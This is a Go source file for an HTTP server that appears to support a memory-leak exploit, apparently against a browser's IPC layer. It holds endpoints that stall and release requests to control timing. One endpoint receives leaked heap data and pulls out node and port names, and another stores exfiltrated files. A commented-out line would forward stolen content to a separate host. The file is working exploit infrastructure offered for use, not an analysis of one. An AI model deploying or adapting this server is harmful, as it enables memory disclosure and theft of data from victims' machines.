package main

import (
    "io"
    "io/ioutil"
    "log"
    "net/http"
    "os"
    "fmt"
    "strconv"
    "sync/atomic"
    "encoding/hex"
    "encoding/binary"
)

type PortItem struct {
    state uint32
    dummy uint32
    node_name []byte
    port_name []byte
    seq uint32
    body []byte
}

func (p PortItem) String() string {
    var retval string = "\n"
    for i := 0; i < 0x80; i += 0x10 {
        retval += fmt.Sprintf("0x%02x: %s %s\n", i, hex.EncodeToString(p.body[i:i+8]), hex.EncodeToString(p.body[i+8:i+0x10]))
    }
    return retval + fmt.Sprintf("\nNode Name: %s\nPort Name: %s\nSeq: %d\n", hex.EncodeToString(p.node_name), hex.EncodeToString(p.port_name), p.seq)
}

func PortFilter(msg []byte) []PortItem {
    const PortSize int = 0x90
    var items []PortItem
    cnt := make(map[string]uint32)

    for i := PortSize; i <= len(msg); i += PortSize {
        state := binary.LittleEndian.Uint32(msg[i:i+4])
        dummy := binary.LittleEndian.Uint32(msg[i+4:i+8])
        seq_num := binary.LittleEndian.Uint32(msg[i+0x28:i+0x2c])
        if state == 3 && dummy == 1 && seq_num == 2 {
            node := msg[i+0x08:i+0x18]
            port := msg[i+0x18:i+0x28]

            items = append(items, PortItem{state, dummy, node, port, seq_num, msg[i:i+PortSize]})
            if _, ok := cnt[string(node)]; !ok {
                cnt[string(node)] = 0
            }
            cnt[string(node)] += 1
        }
    }

    var max_cnt uint32 = 0x0
    for _, v := range cnt {
        if v > max_cnt {
            max_cnt = v
        }
    }

    var candidate []PortItem
    for i := range items {
        // most time, the cnt[string(items[i].node_name)] should be 6 since we only make 6 requests
        // and there are 10 ports with the same node name while leaking the heap data
        // so we just filter out them.
        if cnt[string(items[i].node_name)] == max_cnt {
            continue
        }
        candidate = append(candidate, items[i])
    }
    return candidate
}

var leaked_ports []PortItem = nil
const FILENAME = "./leak_file"

func main() {
    blocking_channel := make(chan int64)
    hang_num := int64(0)

    http.HandleFunc("/hang/", func(w http.ResponseWriter, _ *http.Request) {
        log.Printf("hang request")
        atomic.AddInt64(&hang_num, 1)

        x := <- blocking_channel
        log.Printf("hang released")

		io.WriteString(w, strconv.FormatInt(x, 10))
    })

    http.HandleFunc("/release", func(w http.ResponseWriter, _ *http.Request) {
        num := atomic.LoadInt64(&hang_num)
        log.Printf("release %d hanging connection", num)

        for i := int64(0); i < num; i += 1 {
            atomic.AddInt64(&hang_num, -1)
            blocking_channel <- i
        }
        io.WriteString(w, "ok")
    })

    http.HandleFunc("/port", func(w http.ResponseWriter, r *http.Request) {
        if r.Method == http.MethodGet {
            // return port
            if len(leaked_ports) > 0 {
                ret_body := "[\n"
                for i := range leaked_ports {
                    ret_body += fmt.Sprintf("    [0x%x, 0x%x, 0x%x, 0x%x],\n", binary.LittleEndian.Uint32(leaked_ports[i].port_name[0:4]), binary.LittleEndian.Uint32(leaked_ports[i].port_name[4:8]), binary.LittleEndian.Uint32(leaked_ports[i].port_name[8:12]), binary.LittleEndian.Uint32(leaked_ports[i].port_name[12:16]))
                }
                ret_body += "\n]"

                log.Printf(ret_body)
                io.WriteString(w, ret_body)
            } else {
                log.Printf("[FAIL] No port leaked")
                io.WriteString(w, "[]")
            }
            leaked_ports = nil
        } else if r.Method == http.MethodPost {
            // port filter
            log.Printf("[INFO] Receive Port post")
            body, _ := ioutil.ReadAll(r.Body)
            log.Printf("[INFO] leaked data length: %d\n", len(body))
            ioutil.WriteFile("./leaked_data", body, 0644)
            leaked_ports = PortFilter(body)

            if len(leaked_ports) > 0 {
                for i := range leaked_ports {
                    log.Printf("%+v\n", leaked_ports[i])
                }
            } else {
                log.Printf("[ERROR] Port leak failed, try again.")
            }

            io.WriteString(w, "received")
        } else {
            log.Printf("Unknown method on /port");
        }
    })

    http.HandleFunc("/leak", func(w http.ResponseWriter, r *http.Request) {
        log.Printf("leak request: %s", r.Method)
        if r.Method == http.MethodPost {
            content, _ := ioutil.ReadAll(r.Body)
            ioutil.WriteFile(FILENAME, content, 0644)
            log.Printf("[LEAK] Received file: %s", FILENAME)
            // Send to my MacBook
            // http.Post("http://192.168.8.177:3355/send", "application/octet-stream", bytes.NewBuffer(content))
        } else {
            log.Printf("Unknown method on /leak");
        }
    })

    http.Handle("/", http.FileServer(http.Dir(".")))
    log.Println("Starting server...")
    // log.Fatal(http.ListenAndServeTLS(":443", "cert.pem", "key.pem", nil))
    port, ok := os.LookupEnv("PORT")
    if !ok {
        port = "8077"
    }
    port = ":" + port
    log.Fatal(http.ListenAndServe(port, nil))
}
